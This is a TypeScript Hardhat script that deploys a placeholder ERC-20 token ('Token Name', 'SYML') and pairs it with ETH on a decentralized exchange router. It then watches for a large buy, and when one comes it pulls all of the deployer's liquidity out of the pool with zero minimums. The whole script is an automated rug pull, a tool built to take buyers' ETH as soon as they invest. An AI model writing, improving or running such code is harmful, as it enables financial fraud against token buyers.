import { ethers } from "hardhat";
require("dotenv").config();
const routerAddress = process.env.ROUTER_ADDRESS || "";

async function deploy(
  deployer: any,
  router: any,
  tkName: string,
  tkSymbol: string,
  initSupply: string,
  liqETH: string
) {
  const factory = await ethers.getContractAt(
    "IFactory",
    await router.factory()
  );
  const weth = await ethers.getContractAt("IETH", await router.WETH());

  // Deploy Token
  const Token = await ethers.getContractFactory("Token");
  const tk = await Token.deploy(tkName, tkSymbol, initSupply);

  await tk.waitForDeployment();
  console.log("Token deployed");

  // Get info
  const tkAddress = await tk.getAddress();
  const totalSupply = await tk.totalSupply();
  const amountToLiquidity = totalSupply / 2n; //50% to liquidity

  // Approve for router to use token
  const approveTx = await tk.approve(routerAddress, totalSupply);
  await approveTx.wait();
  console.log("Approved token");

  // Add liquidity
  const deadline = Math.round(Date.now() / 1000 + 300);
  const tx = await router.addLiquidityETH(
    tkAddress,
    amountToLiquidity,
    amountToLiquidity,
    ethers.parseEther(liqETH),
    deployer.address,
    deadline,
    { value: ethers.parseEther(liqETH) }
  );
  await tx.wait();
  console.log("Liquidity added");

  // Get pair
  const pairAddress = await factory.getPair(tkAddress, await router.WETH());
  console.log(
    `Token address: ${tkAddress}`,
    `\nPair address: ${pairAddress}`,
    `\nToken in pair: ${ethers.formatEther(await tk.balanceOf(pairAddress))}`,
    `\nWETH in pair: ${ethers.formatEther(await weth.balanceOf(pairAddress))}`
  );

  return { tkAddress, pairAddress, tk, amountToLiquidity };
}

async function rmLiqETH(
  deployer: any,
  router: any,
  tkAddress: string,
  pairAddress: string
) {
  const pair = await ethers.getContractAt("IPair", pairAddress);

  // Approve for router to use LP
  const lpBalance = await pair.balanceOf(deployer.address);
  if (lpBalance <= 5n) {
    console.log(`No LP for token${tkAddress}`);
    return;
  }
  const approveTx = await pair.approve(await router.getAddress(), lpBalance);
  await approveTx.wait();
  console.log("Approved pair");

  // Remove liquidity ETH
  const deadline = Math.round(Date.now() / 1000 + 300);
  const removeLiquidityTx = await router.removeLiquidityETH(
    tkAddress,
    lpBalance,
    0,
    0,
    deployer.address,
    deadline
  );
  await removeLiquidityTx.wait();
  console.log("Removed liquidity tx hash:", removeLiquidityTx.hash);
}

async function main() {
  const [deployer, _] = await ethers.getSigners();
  const router = await ethers.getContractAt("IRouter", routerAddress);

  const { tkAddress, pairAddress, tk, amountToLiquidity } = await deploy(
    deployer,
    router,
    "Token Name",
    "SYML",
    "100000000000",
    "0.5"
  );

  tk.on("Transfer", async (from, to, amount, event) => {
    if (from == pairAddress && amount >= amountToLiquidity / 10n) {
      try {
        await rmLiqETH(deployer, router, tkAddress, pairAddress);
        await tk.removeAllListeners();
      } catch (err) {
        console.log(err);
      }
    }
  });
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
